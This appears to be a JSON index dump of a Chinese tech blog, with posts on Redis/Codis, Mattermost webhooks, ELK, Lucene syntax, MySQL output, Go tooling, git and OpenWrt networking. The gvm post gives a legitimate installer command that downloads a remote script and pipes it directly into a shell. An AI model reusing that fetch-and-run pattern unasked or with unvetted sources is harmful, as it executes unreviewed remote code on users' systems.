而因为Codis有中心节点（即基于proxy的设计），对client来说，可以像对单机redis一样去操作proxy（除了一些命令不支持），还可以继续使用pipeline。 并且如果proxy后面有多个 redis node，速度会显著快于单redis的pipeline。同时Codis使用zookeeper来作为辅助，这意味着单纯对于redis集群来说，需要额外的机器搭zk，不过对于很多已经在其他服务上用了zk的公司来说这不是问题。","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Codis Pipeline","date":"2020-07-10T03:43:40.000Z","path":"2020/07/10/【Redis】Codis-Pipeline/","text":"codis proxy 处理 “pipeline” 的逻辑：只是在从client 到proxy 有效率的提升（因为使用一次 pipeline意味着只有一次RTT）。而从 proxy 到 redis node的这个过程，依然是对 pipeline 中的每个命令串行地分别进行处理，即使这些命令对应的key位于不同的slot。 By right，可以实现成当这些命令对应的key位于不同的slot，以slot为单位异步地去执行，以如果有两个命令，他们对应的key位于不同的slot，则这两条命令会被并行的去执行，而当他们对应的key位于同一个slot，则自然而然地串行的去执行（因为Redis是单线程的）。 Reference https://github.com/CodisLabs/codis/issues/1372 https://github.com/CodisLabs/codis/issues/265","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"},{"name":"Codis","slug":"CacheSystem/Redis/Codis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/Codis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"},{"name":"Codis","slug":"Codis","permalink":"http://swsmile.info/tags/Codis/"}]},{"title":"【Mattermost】webhook","date":"2020-07-09T10:45:06.000Z","path":"2020/07/09/【Mattermost】webhook/","text":"Incoming WebhooksMattermost supports webhooks to easily integrate external applications into the server. Use incoming webhooks to post messages to Mattermost public channels, private channels and direct messages. Messages are sent via an HTTP POST request to a Mattermost URL generated for each application and contain a specifically formatted JSON payload in the request body. Simple Incoming WebhookLet’s learn how to create a simple incoming webhook that posts the following message to Mattermost. First, go to Main Menu &gt; Integrations &gt; Incoming Webhook. If you don’t have the Integrations option in your Main Menu, incoming webhooks may not be enabled on your Mattermost server or may be disabled for non-admins. Enable them from System Console &gt; Integrations &gt; Custom Integrations in prior versions or System Console &gt; Integrations &gt; Integration Management in versions after 5.12 or ask your System Administrator to do so. Click Add Incoming Webhook and add name and description for the webhook. The description can be up to 500 characters. Select the channel to receive webhook payloads, then click Add to create the webhook. Use a curl command from your terminal or commandline to send the following JSON payload in a HTTP POST request: 123curl -i -X POST -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;text&quot;: &quot;Hello, this is some text\\nThis is more text. :tada:&quot;&#125;&apos; http://&#123;your-mattermost-site&#125;/hooks/xxx-generatedkey-xxx# orcurl -i -X POST --data-urlencode &apos;payload=&#123;&quot;text&quot;: &quot;Hello, this is some text\\nThis is more text. :tada:&quot;&#125;&apos; http://&#123;your-mattermost-site&#125;/hooks/xxx-generatedkey-xxx Outcoming Webhooks//TODO Reference https://docs.mattermost.com/developer/webhooks-incoming.html https://docs.mattermost.com/developer/webhooks-outgoing.html","comments":true,"categories":[{"name":"Mattermost","slug":"Mattermost","permalink":"http://swsmile.info/categories/Mattermost/"}],"tags":[{"name":"Mattermost","slug":"Mattermost","permalink":"http://swsmile.info/tags/Mattermost/"}]},{"title":"【ELK】ELK（Elasticsearch+Logstash+Kibana）学习","date":"2020-07-07T12:59:08.000Z","path":"2020/07/07/【ELK】ELK学习/","text":"日志服务日志服务是我们应用程序后端不可或缺的一个组件，通常我们会组合使用 ELK（Elasticsearch+Logstash+Kibana）技术栈来自行搭建一个日志存储和分析系统。 为什么做日志系统 通常当系统发生故障时，工程师需要登录到各个服务器上，使用 grep / sed / awk 等 Linux 脚本工具去日志里查找故障原因。在没有日志系统的情况下，首先需要定位处理请求的服务器，如果这台服务器部署了多个实例，则需要去每个应用实例的日志目录下去找日志文件。每个应用实例还会设置日志滚动策略（如：每天生成一个文件），还有日志压缩归档策略等。这样一系列流程下来，对于我们排查故障以及及时找到故障原因，造成了比较大的麻烦。因此，如果我们能把这些日志集中管理，并提供集中检索功能，不仅可以提高诊断的效率，同时对系统情况有个全面的理解，避免事后救火的被动。总的来说有一下三点 数据查找：通过检索日志信息，定位相应的 bug，找出解决方案。 服务诊断：通过对日志信息进行统计、分析，了解服务器的负荷和服务运行状态 数据分析：可以做进一步的数据分析。 ELKWhy ELK是什么东西，很好理解，就是收集（L:Logstash），存储（E：Elasticsearch），可视化日志（K：Kibana）的。 在前几年ELK为什么没有怎么听说，那是因为在服务器上 tail -f 就可以看日志，或者下载下来打开直接看。但是随着软件的不断发展，分布式，推荐系统，大数据等等，这些数据日积月累后的必然产物就诞生了。 就拿分布式系统来说，日志都分布在各个node上，要查看一个bug，需要登录到服务器上看好多node上的日志，再比如调用连很长的话，在服务器上看日志，或者下载下来看日志，我只能说有可能好几天都找不出来问题所在。还有登陆到服务器上，是一个很危险的信号，万一rm -rf，就真的是从入门到删库跑路了。以上种种问题怎么解决呢？这个时候就是ELK上场了。 ELK工作流程 在需要收集日志的所有服务上部署logstash，作为logstash agent（logstash shipper）用于监控并过滤收集日志，将过滤后的内容发送到Redis，然后logstash indexer将日志收集在一起交给全文搜索服务ElasticSearch，可以用ElasticSearch进行自定义搜索，通过Kibana 来结合自定义搜索进行页面展示。 部署方式ELK部署最简单的方式就是L-E-K方式，不添加任何其他辅助系统，部署简单快速，容易上手。 第二种方式：随着业务的增长，上面的方案已满足不了我们的需求，这个时候我们可以增加一层缓冲层，比如用消息队列（如Kafka）、Redis。 这种架构使用 Logstash 从各个数据源搜集数据，然后经消息队列输出插件输出到消息队列中。目前 Logstash 支持 Kafka、Redis、RabbitMQ 等常见消息队列。然后 Logstash 通过消息队列输入插件从队列中获取数据，分析过滤后经输出插件发送到 Elasticsearch，最后通过 Kibana 展示。 ElasticsearchElasticsearch是个开源分布式全文搜索和分析引擎（full-text search and analysis engine），它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 Logstash - Log AggregatorLogstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如用于搜索）。 Logstash 主要是用来日志的搜集、分析、过滤日志的工具，支持大量的数据获取方式。一般工作方式为c/s架构，client端安装在需要收集日志的主机上，server端负责将收到的各节点日志进行过滤、修改等操作在一并发往elasticsearch上去。 KibanaKibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志 使用Filebeat来采集日志 Reference https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html https://www.elastic.co/guide/index.html https://logz.io/learn/complete-guide-elk-stack/#elasticsearch https://www.jianshu.com/p/09beacb7dbf6 https://zhuanlan.zhihu.com/p/45490773 https://www.jianshu.com/p/934c457a333c https://hackernoon.com/elastic-stack-a-brief-introduction-794bc7ff7d4f","comments":true,"categories":[{"name":"ELK","slug":"ELK","permalink":"http://swsmile.info/categories/ELK/"}],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://swsmile.info/tags/ELK/"}]},{"title":"【Lucene】Lucene 语法","date":"2020-07-06T14:53:34.000Z","path":"2020/07/06/【Lucene】Lucene-语法/","text":"Kibana使用的查询语法是Lucene的查询语法。 布尔操作符支持多种操作符： ANDAND操作符用于连接两个搜索条件，仅当两个搜索条件都满足时，才认为匹配。通常用来做交集操作。也可以使用&amp;&amp;替换。注意必须使用大写。如果不使用AND，而是and，可能会被单做关键词进行搜索！ 例如：搜索同时包含a和b的文档 1a AND b 或者 1a &amp;&amp; b OROR操作符用于连接两个搜索条件，当其中一个条件满足时，就认为匹配。通常用来做并集操作。也可以使用||替换。注意必须使用大写。 例如：搜索包含a或者b的文档 1a OR b 或者 1a || b 默认情况下，会把包含空格的字符串用 OR 解析： For example, a query string of capital of Hungary is interpreted as capital OR of OR Hungary. NOTNOT操作符排除某个搜索条件。通常用来做差集操作也可以使用!替换。注意必须大写。 例如：搜索包含a，不包含b的文档 1a NOT b 或者 1a &amp;&amp; !b 在kibana中支持单独使用，如：排除包含test的文档 1NOT test + - 加号文档一直要包含该操作符后跟着的搜索条件，如：搜索包含tom的文档 1+tom 也支持在字段中使用小括号。如：要搜索标题中，既包含a也包含b的 1title:(+a +\"b\") - - 减号排除该操作符后跟着的搜索条件，如：搜索不包含tom的文档 1-tom 如果想要查询语句与文档匹配，那么给定的Term不能出现在文档中。例如：希望搜索到包含关键词lucene,但是不含关键词elasticsearch的文档，可以用如下的查询表达式：”+lucene -elasticsearch”。 效果类似NOT。 通配符查询（Wildcards）通配符一般包括如下 ?：匹配单个字符 *：匹配0个或多个字符 语法如下 1?tere 意味着搜索there、where等类似的文档 1test* 意味着搜索test、tests、tester 正则表达式（Regular Expressions）Regular expression patterns can be embedded in the query string by wrapping them in forward-slashes (&quot;/&quot;): 1name:/joh?n(ath[oa]n)/ See https://www.elastic.co/guide/en/elasticsearch/reference/current/regexp-syntax.html. 范围查询（Ranges）范围查询允许你指定某个字段最大值和最小值，查询在二者之间的所有文档。范围查询可以包含或者不包含最大值和最小值，排序是按照字典顺序来排序的。 ·{}：尖括号表示不包含最小值和最大值，可以单独使用 []：方括号表示包含最小值和最大值，可以单独使用。 1date:[20020101 TO 20030101] 如果搜索成绩grade字段小于等于80分，大于60分的，可以写成下面的方式 1grade:&#123;60,80] 如果搜索name在A和C之间的，可以使用如下的语法 1name:&#123;A,C&#125; 例子 All days in 2012: 1date:[2012-01-01 TO 2012-12-31] Numbers 1..5 1count:[1 TO 5] Tags between alpha and omega, excluding alpha and omega: 1tag:&#123;alpha TO omega&#125; Numbers from 10 upwards 1count:[10 TO *] Dates before 2012 1date:&#123;* TO 2012-01-01&#125; Numbers from 1 up to but not including 5 1count:[1 TO 5&#125; Ranges with one side unbounded can use the following syntax: 1234age:&gt;10age:&gt;=10age:&lt;10age:&lt;=10 转义字符（Reserved Characters）If you need to use any of the characters which function as operators in your query itself (and not as operators), then you should escape them with a leading backslash. For instance, to search for (1+1)=2, you would need to write your query as \\(1\\+1\\)\\=2. When using JSON for the request body, two preceding backslashes (\\\\) are required; the backslash is a reserved escaping character in JSON strings. 由于Lucene中支持很多的符号，如 1+ - &amp;&amp; || ! ( ) &#123; &#125; [ ] ^ \" ~ * ? : \\ 因此如果需要搜索 (1+1):2 需要对改串进行转换，使用字符\\。 1\\(1\\+1\\)\\:2 域（Field）Lucene支持多字段数据，当你在查询的时候你可以指定一个字段查询，也可以使用默认的字段。你可以使用字段名:查询词。 来指定字段名搜索。举个栗子，让我们假定Lucene的索引中含有两个字段，Title字段和Text字段，其中Text字段是默认字段，当你想找到一篇文档其中标题包含“The Right Way”同时文本中包含“go”，你可以输入： 1234title:&quot;The Right Way&quot; AND text:go 或者：title:&quot;The Right Way&quot; AND go 例子 where the status field contains active 1status:active where the title field contains quick or brown 1title:(quick OR brown) where the author field contains the exact phrase &quot;john smith&quot; 1author:&quot;John Smith&quot; 分组搜索（Grouping Search）Lucene支持使用括号将子句分组以形成子查询。如果要控制查询的布尔逻辑，这可能非常有用。 1(jakarta OR apache) AND jakarta Reference https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html#query-string-syntax https://lucene.apache.org/core/6_6_0/queryparser/org/apache/lucene/queryparser/classic/package-summary.html https://www.gowhich.com/blog/861","comments":true,"categories":[{"name":"Lucene","slug":"Lucene","permalink":"http://swsmile.info/categories/Lucene/"}],"tags":[{"name":"Lucene","slug":"Lucene","permalink":"http://swsmile.info/tags/Lucene/"}]},{"title":"【MySQL】将执行结果输出到文件","date":"2020-07-06T14:42:50.000Z","path":"2020/07/06/【MySQL】操作-将执行结果输出到文件/","text":"Approach 1123mysql&gt; select count(1) from table into outfile &apos;/tmp/test.log&apos;;Query OK, 31 rows affected (0.00 sec) 在目录/tmp/下会产生文件test.xlog 遇到的问题： 12mysql&gt; select count(1) from table into outfile &apos;/tmp/test.log&apos;;ERROR 1 (HY000): Can&apos;t create/write to file &apos;/tmp/test.log&apos; (Errcode: 13) 原因：mysql User没有向/tmp/下写的权限。 Approach 21234567# 之后的所有查询结果都自动写入/tmp/test.logmysql&gt; pager cat &gt; /tmp/test.log ;PAGER set to 'cat &gt; /tmp/test.log'mysql&gt; select * from table ;30 rows in set (0.59 sec)# 在窗口内不再显示查询结果 Approach 31$ mysql -h 127.0.0.1 -u root -p XXXX -P 3306 -e \"select * from table\" &gt; /tmp/test.log Reference https://www.cnblogs.com/emanlee/p/4233602.html","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Golang】通过私有库安装依赖","date":"2020-07-06T14:32:33.000Z","path":"2020/07/06/【Golang】依赖-通过私有库安装依赖/","text":"Situation公司一个golang的项目，使用到了公司的私有仓库，去执行go mod tidy（下载依赖）的时候，到download公司私有库的时候就报错，报错信息也不明显，只是提示找不到影响版本unkown revision。 go mod tidy - 下载更新依赖 go install 这种下载依赖的方式其实是通过go get的方式去下载的 go insall -x - 加上-x命令，可以查看更多的错误信息 Solution升级 git 版本go mod调用链中会用到一些git指令，当git版本比较旧时，调用失败产生错误，并给出歧义的提示信息，提示unknown revision。 123456789101112131415# 安装最新的 git$ brew install git$ which git/usr/bin/git$ git --versiongit version 2.17.2 (Apple Git-113)# 通过 brew link 将 git 指向我们通过 Homebrew 安装的 git$ brew link git --overwrite$ which git/usr/bin/git$ git --versiongit version 2.27.0 声明私有库路径1$ go env -w GOPRIVATE=\"git.xxx.com\" 修改git配置go install/mod tidy 去下载依赖时，是通过git命令去下载的，而且默认是http协议去下载的，建议是修改为ssh协议去获取。 通过修改文件方式，去到当前用户目录修改.gitconfig文件，新增如下，注意私有库是http还是https。 12[url \"git@gitlab.xxx.com:\"] insteadOf = https://git.xxx.com/ 或者，通过命令行形式，直接执行命令如下： 1git config --global url.\"git@gitlab.xxx.com:\".insteadOf \"http://gitlab.xxx.com/\" 然后执行go install 或者 go mod tidy确认是否可以正常下载依赖Reference https://cloud.tencent.com/developer/article/1602151 https://stackoverflow.com/questions/55503167/go-build-cant-find-a-revision https://confluence.shopee.io/pages/viewpage.action?pageId=119292265","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】生成随机数","date":"2020-07-06T14:19:44.000Z","path":"2020/07/06/【Golang】使用-生成随机数/","text":"GoLang 中的伪随机数在GoLang 中，我们可以通过 math/rand 包里的方法来生成一个伪随机数： 12345678910package mainimport ( \"fmt\" \"math/rand\")func main() &#123; fmt.Println(rand.Int()) // =&gt; 5577006791947779410&#125; 上面的代码中，我们通过 rand.Int() 方法来生成一个伪随机数。看起来好像没什么问题嘛，人家也很 OK 啦。 但是细心的你会发现。无论你运行多少次，它都会生成一样的结果。 我们知道 JavaScript 中的 Math.random() 每次都会返回一个不一样的数字，但是 GoLang 中的伪随机数生成器默认情况下竟然会返回相同的数值，这还不反了天了？ 都是伪随机数生成器，为什么差别就这么大呢？这里我们就要了解一下“随机种子”的概念啦。 随机种子我们知道，伪随机数，是使用一个确定性的算法计算出来的似乎是随机的数序，因此伪随机数实际上并不随机。 那么自然，在计算伪随机数时假如使用的开始值不变的话，那么算法计算出的伪随机数的数序自然也是不变的咯。 这个“开始值”，就被称为随机种子。 Int returns a non-negative pseudo-random int from the default Source. Seed uses the provided seed value to initialize the default Source to a deterministic state. If Seed is not called, the generator behaves as if seeded by Seed(1). Seed values that have the same remainder when divided by 2³¹-1 generate the same pseudo-random sequence. Seed, unlike the Rand.Seed method, is safe for concurrent use. 查阅文档，我们得知，Int() 函数是从 default Source（默认源）中产生的伪随机数。 而这个 default Source，我们从 Seed 部分可以看到，如果你没有设置随机种子，那么默认初始种子总是从 1 开始。 既然随机种子一样，那自然其结果也是一样的。 随机的伪随机数我们已经知道了默认随机种子是从 1 开始，那么我们只要在每次生成随机数之前先设置一个不一样的种子，那么其结果自然也就不一样了。 我们要尽可能保证每次伪随机数生成器工作时使用的是不同的种子，通常的做法是采用当前时间作为种子。 12345678910111213package mainimport ( \"fmt\" \"math/rand\" \"time\")func main() &#123; rand.Seed(int64(time.Now().UnixNano())) fmt.Println(rand.Int())&#125; 这样，由于种子不同，我们每次运行的结果也就不一样。我们就能达到获取伪随机数的目的啦。 真随机数如果我们的应用对安全性要求比较高，需要使用真随机数的话，那么可以使用 crypto/rand 包中的方法。 123456789101112131415package mainimport ( \"crypto/rand\" \"fmt\" \"math/big\")func main() &#123; // 生成 20 个 [0, 100) 范围的真随机数。 for i := 0; i &lt; 20; i++ &#123; result, _ := rand.Int(rand.Reader, big.NewInt(100)) fmt.Println(result) &#125;&#125; 上面的程序每次运行的结果都是不一样的，会真正随机的生成随机数。 Reference https://golang.google.cn/pkg/math/rand/ https://juejin.im/post/5ab0c7f06fb9a028d936fe5c","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Git】忽略已经提交的文件","date":"2020-07-06T14:13:09.000Z","path":"2020/07/06/【Git】忽略已经提交的文件/","text":"​ Situaion在初始化git仓库的时候，没有创建.gitignore文件来过滤不必要提交的文件，后来却发现某些文件不需要提交，但是这些文件已经被提交了。 这时候创建.gitignore文件并添加对应规则以忽略这些文件，就会发现，对这些文件的修改仍然会被 track到，即忽略ignore的规则对那些已经被track的文件无效。 其实.gitignore文件只会忽略那些没有被跟踪的文件，也就是说ignore规则只对那些在规则建立之后被新创建的新文件生效。 因此推荐: 初始化git项目时就创建.gitignore文件。 Solution删除track的文件 (已经commit的文件) git rm 要忽略的文件 git commit -a -m &quot;删除不需要的文件&quot; 在.gitignore文件中添加忽略规则 在.gitignore文件中添加ignore条目, 如: some/path/some-file.ext 提交.gitignore文件: git commit -a -m &quot;添加ignore规则&quot; 推送到远程仓库是ignore规则对于其他开发者也能生效: git push [remote] Reference https://www.jianshu.com/p/e5b13480479b","comments":true,"categories":[{"name":"Git","slug":"Git","permalink":"http://swsmile.info/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://swsmile.info/tags/Git/"}]},{"title":"【Golang】gvm - Golang 版本管理","date":"2020-07-06T14:08:36.000Z","path":"2020/07/06/【Golang】依赖-Golang-版本管理/","text":"Installing1zsh &lt; &lt;(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer) Or if you are using bash just change zsh with bash. Installing Go12gvm install go1.4gvm use go1.4 [--default] List Go VersionsTo list all installed Go versions (The current version is prefixed with “=&gt;”): 1gvm list Reference https://github.com/moovweb/gvm","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】代码检查","date":"2020-07-06T12:55:29.000Z","path":"2020/07/06/【Golang】代码检查/","text":"易犯错误幽灵变量（shadowed variables）如果你在新的代码块中像下边这样误用了 :=，编译不会报错，但是变量不会按你的预期工作： 12345678910func main() &#123; x := 1 println(x) // 1 &#123; println(x) // 1 x := 2 println(x) // 2 // 新的 x 变量的作用域只在代码块内部 &#125; println(x) // 1&#125; Solution: go-nyet","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】幽灵变量（Shadowed Variables）","date":"2020-07-06T12:45:38.000Z","path":"2020/07/06/【Golang】幽灵变量/","text":"幽灵变量（Shadowed Variables）Example 1如果你在新的代码块中像下边这样误用了 :=，编译不会报错，但是变量不会按你的预期工作： 12345678910func main() &#123; x := 1 println(x) // 1 &#123; println(x) // 1 x := 2 println(x) // 2 // 新的 x 变量的作用域只在代码块内部 &#125; println(x) // 1&#125; 这是 Go 开发者常犯的错，而且不易被发现。 Example 212345678func main() &#123; n := 0 if true &#123; n := 1 n++ &#125; fmt.Println(n) // 0&#125; The statement n := 1 declares a new variable which shadows the original n throughout the scope of the if statement. To reuse n from the outer block, write n = 1 instead. 12345678func main() &#123; n := 0 if true &#123; n = 1 n++ &#125; fmt.Println(n) // 2&#125; Example 31234567891011func BadRead(f *os.File, buf []byte) error &#123; var err error for &#123; n, err := f.Read(buf) // shadows the function variable 'err' if err != nil &#123; break // causes return of wrong value &#125; foo(buf) &#125; return err&#125; Rescuego vetThis analyzer check for shadowed variables. A shadowed variable is a variable declared in an inner scope with the same name and type as a variable in an outer scope, and where the outer variable is mentioned after the inner one is declared. 12go install golang.org/x/tools/go/analysis/passes/shadow/cmd/shadowgo vet -vettool=$(which shadow) go-nyetInstallation1$ go get github.com/barakmich/go-nyet 这个包的运行方式有三种：目录/包/文件。对应的命令如下： 12345$ go-nyet ./...# or$ go-nyet subpackage# or$ go-nyet file.go 实际使用使用方法如下： 12&gt; $GOPATH/bin/go-nyet main.gomain.go:10:3:Shadowing variable `x` Reference https://www.cnblogs.com/Detector/p/9726930.html https://rpeshkov.net/blog/golang-variable-shadowing/","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【OpenWrt】OpenWrt学习","date":"2020-07-03T15:16:05.000Z","path":"2020/07/03/【OpenWrt】OpenWrt学习/","text":"OpenWrt 网络接口（Network Interfaces）物理网络接口（Physical Network Interfaces）eth0, eth8, radio0, wlan19, .. 这些符号总是代表着真实存在的网络设备。 例如： [NIC](https://en.wikipedia.org/wiki/Network interface controller), [WNIC](https://en.wikipedia.org/wiki/Wireless network interface controller) 或其他一些 Modem。当[device driver](https://en.wikipedia.org/wiki/device driver)被作为物理网络接口的驱动加载进内核，这些网络接口就可用了。 任何物理网络接口是由操作系统为用户命名的软件的网络接口，以使得操作系统配置物理网络设备并且将其集成到程序和脚本中。 虚拟网络接口（Virtual Network Interfaces）lo, eth0:1, eth0.1, vlan2, br0, pppoe-dsl, gre0, sit0 tun0, imq0, teql0, .. are virtual network interfaces that do NOT represent an existent hardware device but are linked to one (otherwise they would be useless). Virtual network interfaces were invented to give the system administrator maximum flexibility when configuring a Linux-based operating system. A virtual network interface is generally associated with a physical network interface (eth6) or another virtual interface (eth6.9) or be stand alone such as the loopback interface lo. e –&gt; Types of Virtual Network Interfaces aliases\\: eth4:5, eth4:6, ..IP-aliases are an obsolete way to manage multiple IP-addresses/masks per interface. Newer tools such as iproute2 support multiple address/prefixes per interface, but aliases are still supported for backwards compatibility. Documentation/networking/alias.txt VLANs\\: eth4.0, eth4.1, eth4.3, vlan0, ..are created to partition a single layer 2 network into multiple virtual ones. The drivers all participating network cards must support [IEEE 802.1Q](https://en.wikipedia.org/wiki/IEEE 802.1Q) and be configured accordingly. This standard allows for up to 4096 VLANs (12Bits). Stacked VLANs\\: [IEEE 802.1ad](https://en.wikipedia.org/wiki/IEEE 802.1ad)-support was mainlined in 2013-04-19: net: vlan: add 802.1ad support Configuration is done using ip link: 12ip link add link eth0 eth0.1000 type vlan proto 802.1ad id 1000ip link add link eth0.1000 eth0.1000.1000 type vlan proto 802.1q id 1000 bridgeds\\: br0, br-lanare used to make multiple virtual or physical network interfaces act as if they were just one network interface (quasi the opposite of VLANs). Can also be used for VPN and bridged interfaces. The Linux Ethernet bridge can be used for connecting multiple Ethernet devices together. The connecting is fully transparent: hosts connected to one Ethernet device see hosts connected to the other Ethernet devices directly. understanding how bridge-interfaces work tunnel interfaces\\: pppoe-dsl, pppoa-dsl, tun0, vpn1, used to send packets over a [tunneling protocol](https://en.wikipedia.org/wiki/tunneling protocol) such as [GRE](https://en.wikipedia.org/wiki/Generic Routing Encapsulation), IPsec [PPPoE](https://en.wikipedia.org/wiki/Point-to-point protocol over Ethernet), etc. special purpose\\: imq0, teql3used to change the order of outgoing network packets, or incoming network packet wireless operating mode virtual interfaces\\: wlan0, wlan0_1, ath3, ath_monitor, ..Linux wireless subsystem: There is always one physical network interface for each WNIC called the master interface. The master interface is invisible. Then, depending on the wireless operating mode the master interface is configured to, ad-hoc (IBSS), managed , AP , WDS, mesh point, monitor, wireless virtual network interfaces with different properties are created. This is done automatically by default. When the WNIC driver is loaded, there always will be the master interface and (at least) one virtual interface! 总结 lo 虚拟设备端口，自身回环设备，一般指向 127.0.0.1 eth0 物理网卡0， eth0.1 或者 eth0.2 都是从此设备虚拟而出。 br-lan 虚拟设备，用于 LAN 口设备桥接（bridge），以使多个虚拟（或物理）网络接口看起来好像他们仅有一个网络接口一样。目前路由器普遍将有线 LAN 口（一般四个）和 WIFI 无线接口桥接在一个局域网 （LAN）中。可以使用 brctl show 来查看使用情况。 eth1 如果路由器有两块物理网卡，一般 eth1 则作为 WAN 口 wlan0 一般是通过 2.4G WIFI 连接的设备组成的VLAN wlan1 一般是通过 5G WIFI 连接的设备组成的VLAN 可以使用如下命令来查看 br-lan 配置 1234567$ brctl showbridge name bridge id STP enabled interfacesbr-lan 7fff.8c53c3e337c6 no lan2 wlan0 lan3 wlan1 lan1 br-lan = lan1 + lan2 + lan3 + wlan0 + wlan1，即将通过有线 LAN 口和无线 WIFI 连接的设备都划到同一个局域网 LAN（相互之间可以互相访问，如果配置了特殊的防火墙规则除外）。 Experiment我们可以做个小实验，我通过网线路由器的 lan1，然后打开 YouTube 8K 视频并等待一段时间： lan1的 RX bytes（Receive bytes）变化： 123RX bytes:373973 (365.2 KiB) TX bytes:319941 (312.4 KiB)-&gt;RX bytes:10928410 (10.4 MiB) TX bytes:1316063670 (1.2 GiB) br-lan 的 TX bytes（Transmit bytes）变化： 123RX bytes:1145549 (1.0 MiB) TX bytes:1281534 (1.2 MiB)-&gt;RX bytes:15108596 (14.4 MiB) TX bytes:1327603944 (1.2 GiB) eth0 的变化： 123RX bytes:2547340 (2.4 MiB) TX bytes:2559632 (2.4 MiB)-&gt;RX bytes:1349165970 (1.2 GiB) TX bytes:1353434420 (1.2 GiB) wan 的变化： 123RX bytes:1208653 (1.1 MiB) TX bytes:1089786 (1.0 MiB)-&gt;RX bytes:1313855306 (1.2 GiB) TX bytes:16209461 (15.4 MiB) 这说明：从Youtube Server的视频流量会先到达 wan口的 RX（体现在 wan 的 RX），然后被转发到 eth0（体现在 eth0 的 RX），再被转发到 br-lan（体现在 wan 的 TX），最终到达 lan（体现在 lan1 的 TX）。 类似地， 如果我通过5G WIFI连接路由器（来播放YouTube 8K），wlan0的TX就会对应增加。 如果我通过lan1连接到路由器，进行大流量的TCP传输（路由器传输到连接 lan1 对应的设备）： 1234567891011121314eth0RX bytes:151078628 (144.0 MiB) TX bytes:151155830 (144.1 MiB)-&gt;RX bytes:28786916569 (26.8 GiB) TX bytes:417208939 (397.8 MiB)br-lanRX bytes:11109876 (10.5 MiB) TX bytes:136662101 (130.3 MiB)-&gt;RX bytes:27147493858 (25.2 GiB) TX bytes:382216096 (364.5 MiB)lan1RX bytes:1342750 (1.2 MiB) TX bytes:10436669 (9.9 MiB)-&gt;RX bytes:28059162930 (26.1 GiB) TX bytes:33696055 (32.1 MiB) 各种模式路由器模式路由器模式也就是最常见的无线模式，通过有线连接路由器 WAN 口至互联网，并发射无线提供局域网络。 下面设置的含义是：WAN这个VLAN和WAN6 这个VLAN在同一个DMZ。 桥接AP模式 Bridged AP is to extend your existing wired host router to have wireless capabilities. Clients connecting to OpenWRT will get an IP address from the wired host router. 即 OpenWrt 路由器只作为一个AP（不具有 NAT 和DHCP功能），通过 WIFI 连接到OpenWrt 路由器的设备由上一级路由器（在上图中，是192.168.1.1）来提供 NAT 和 DHCP 服务。 创建一个 interface编辑 /etc/config/network，创建一个 interface，并为其设置一个IP地址，比如： 12345678config interface swlan option ifname eth0 option type bridge option proto static option ipaddr 192.168.1.2 option netmask 255.255.255.0 option gateway 192.168.1.1 option dns 192.168.1.1 This IP address must be an unused one within the network subnet of the main router. You could also change option proto static to option proto dhcp and let the main router decide the AP（Openwrt路由器）’s address, but of course from then on the access point needs a DHCP server. 如果你需要管理这个OpenWrt，可以直接访问 192.168.1.2 进入其Luci。 Disable dnsmasq1$ /etc/init.d/dnsmasq disable 虽然这一步并没有太大的意义。 Connect host router and openwrt router correctlyEnsure the host router is connected with a lan port of the openwrt, not the wan port! Configure and enable the wireless networkIn /etc/config/wireless, locate the existing wifi-iface section and change its network option to point to the newly created interface section. 123456config wifi-iface option device wifi0 option network swlan option mode ap option ssid OpenWrt option encryption none 重点在于 option network swlan1，这样以后，通过 WIFI 连接到Openwrt路由器的设备将会由上一级路由器（在上图中，是192.168.1.1）来提供 NAT 和 DHCP 服务。 Enable the new wireless network. 12root@OpenWrt:~# ifup wifiroot@OpenWrt:~# wifi 如果希望通过特定有线端口连接到Openwrt路由器的设备也由上一级路由器（在上图中，是192.168.1.1）来提供 NAT 和 DHCP 